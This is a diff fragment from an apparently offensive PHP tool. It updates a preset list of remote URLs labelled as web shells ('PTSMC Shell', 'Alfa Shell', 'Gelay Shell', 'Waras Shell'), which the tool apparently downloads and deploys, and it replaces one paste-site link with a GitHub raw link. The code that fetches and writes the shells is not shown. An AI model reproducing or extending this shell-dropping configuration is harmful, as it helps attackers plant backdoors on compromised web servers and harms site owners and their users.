@@ -52,7 +52,7 @@ $status_log = "";
 // --- PRESET TEMPLATES ---
 $templates = [
     "" => "-- Select Module Template --",
-    "https://pastedav.id/d/Fcf1PGmt" => "Template 1: PTSMC Shell",
+    "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/demo" => "Template 1: PTSMC Shell",
     "https://hushh.pro/a1/webshell/alfasc.txt" => "Template 2: Alfa Shell",
     "https://hushh.pro/a1/webshell/gelay.txt" => "Template 3: Gelay Shell",
     "https://okepaste.cc/r/19c86cf0" => "Template 4: Waras Shell",
